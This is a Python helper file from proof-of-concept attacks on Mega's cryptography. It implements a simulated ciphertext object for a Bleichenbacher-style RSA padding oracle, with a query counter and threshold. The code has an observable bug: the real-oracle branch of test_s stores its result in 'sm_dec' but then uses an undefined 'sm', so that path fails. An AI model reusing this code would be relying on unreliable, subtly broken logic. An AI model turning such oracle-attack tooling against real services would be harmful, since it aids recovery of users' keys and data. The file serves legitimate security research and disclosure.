
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: Implements a ciphertext object, that, if it is given the corresponding
# plaintext value, avoids expensive RSA operations if possible by operating in
# the plaintext domain.
#

from shared.attack_utils import *
from shared.mega_simulation import *

class QueryThresholdException(Exception):
    """
    Exception thrown by the Ciphertext class if the maximal number of oracle queries
    was exceeded.
    """
    pass

class Ciphertext:
    """
    Object representing a ciphertext, but actually contains the plaintext. This
    is used to make the Bleichenbacher oracle simulation cheaper by avoiding RSA
    operations.

    throws a QueryThresholdException is the maximal number of oracle queries was exceeded.
    """

    def __init__(self, pk, decrypt_oracle, form_predicate, m=None, c=None,
                max_query_thr=None):
        """
        :params pubk: (n, e)
        :params decrypt_oracle: wraps secret key and decrypts ciphertexts
        :params form_predicate: takes a ciphertext (as integer) and returns true,
            if it satisfies the oracle predicate.
        :params m: message m
        :params c: ciphertext m^e mod n
        :param max_query_thr: throw a QueryThresholdException exception if the number of oracle
            queries exceeds this threshold.
        """
        self.n, self.e = pk
        self.modulus_byte_size = ceil_int_div(self.n.bit_length(), 8)
        self.decrypt_oracle = decrypt_oracle
        self.form_predicate = form_predicate

        self.m = m
        self.c = c

        self.possible_prefixes = list(range(1 << PREFIX_MAX_BIT_LEN))

        self.oracle_query_cnt = 0
        self.max_query_thr = max_query_thr

    def test_s(self, s):
        """
        Test whether s*m satisfies the oracle for (s^e) mod N * c = (s*m)^e mod N.
        Avoid RSA operations if m is given
        """
        if self.m:
            sm = chat_rsa_unpad(int_to_bytes((self.m * s) % self.n), self.modulus_byte_size)
        else:
            s_enc = pow(s, self.e, self.n)
            c_modified = int_to_bytes((s_enc * self.c) % self.n)
            sm_dec = self.decrypt_oracle(len_encode(c_modified))

        self.oracle_query_cnt += 1
        if self.max_query_thr and self.oracle_query_cnt > self.max_query_thr:
            raise QueryThresholdException

        return self.form_predicate(sm)
